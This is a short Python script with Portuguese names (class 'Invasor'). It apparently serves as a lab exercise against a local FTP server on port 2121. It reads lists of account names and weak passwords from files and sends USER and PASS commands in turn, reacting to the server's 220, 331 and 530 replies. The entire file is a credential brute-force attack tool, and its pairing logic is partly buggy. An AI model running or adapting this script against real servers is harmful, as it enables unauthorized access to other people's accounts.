import socket
import time
class Invasor:
    def __init__(self):
        self.host='localhost'
        self.porta=2121
        self.invasor=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.lista_de_nomes=[]
        self.lista_de_senhas=[]
    def invadir(self):
        with open ('nomes_de_conta_servidor.txt','r') as dump_de_nomes:
            for nome in dump_de_nomes:
                self.lista_de_nomes.append(nome)
        with open ('senhas_fracas_servidor.txt','r') as dump_de_senhas:
            for senha in dump_de_senhas:
                self.lista_de_senhas.append(senha)


        self.invasor.connect((self.host,self.porta))
        index_nomes_atual=0
        index_senha_atual=0

        while index_senha_atual!=len(self.lista_de_senhas):
            index_senha_atual=int(index_senha_atual)
            mensagem_recebida=self.invasor.recv(1024).decode()
            if mensagem_recebida.startswith('220'):
                self.invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
                print (f'Enviado usuario {self.lista_de_nomes[index_nomes_atual]}')
                index_nomes_atual+=1
            elif mensagem_recebida.startswith('331'):
                self.invasor.send((f'pass {self.lista_de_senhas[index_senha_atual]}').encode())
                print (f'Enviado senha {self.lista_de_senhas[index_senha_atual]}')
                index_senha_atual+=1
            elif mensagem_recebida.startswith('530'):
                self.invasor.send((f'user {self.lista_de_nomes[index_nomes_atual]}').encode())
                print (f'Enviado usuario {self.lista_de_senhas[index_senha_atual]}')
                index_nomes_atual+=1
            else:
                print('Esperando uma conexão ser liberada...')
                time.sleep(10)
            
            #tempo de espera por visibilidade
            time.sleep(0.2)
            




programa_invadir=Invasor()

programa_invadir.invadir()

